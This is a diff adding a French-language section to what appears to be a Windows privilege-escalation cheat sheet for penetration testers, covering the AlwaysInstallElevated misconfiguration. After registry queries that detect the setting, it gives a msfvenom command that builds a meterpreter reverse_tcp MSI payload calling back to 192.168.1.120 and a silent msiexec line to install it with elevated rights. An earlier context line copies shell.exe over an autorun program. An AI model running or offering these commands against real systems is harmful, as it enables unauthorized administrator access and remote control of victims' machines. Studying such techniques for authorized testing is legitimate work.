@@ -26,3 +26,25 @@ copy it to program.exe
 ```
 copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"
 ```
+
+## AlwaysInstallElevated
+ Dans les tests de pénétration, lorsque nous lançons un shell de commande en tant qu'utilisateur local, il est possible d'exploiter les fonctions vulnérables (ou les paramètres de configuration) de la stratégie de groupe de Windows, afin de les élever aux privilèges d'administrateur et d'obtenir l'accès d'administrateur.
+ Comme nous le savons tous, le système d'exploitation Windows est doté d'un moteur Windows Installer qui est utilisé par les paquets MSI pour l'installation d'applications. Ces paquets MSI peuvent être installés avec des privilèges élevés pour les utilisateurs non administrateurs.
+**Detection**
+Pour detecter cela il suffit
+```
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+Comme nous pouvons le voir dans la sortie, le registre nommé "AlwaysInstallElevated" existe avec une valeur dword (REG_WORD) de 0x1, ce qui signifie que la stratégie AlwaysInstallElevated est activée.
+
+- Privilege Escalation via .msi payload (1st Method)
+La premiere methode est de creer un payload en `.msi` ensuite l'executer avec `msiexec /quiet /qn /i`
+/quiet = Supprime tout message à l'utilisateur pendant l'installation
+/qn = Pas d'interface graphique
+/i = Installation normale (vs. administrative)
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi > shell.msi
+
+msiexec /quiet /qn /i shell.msi
+```
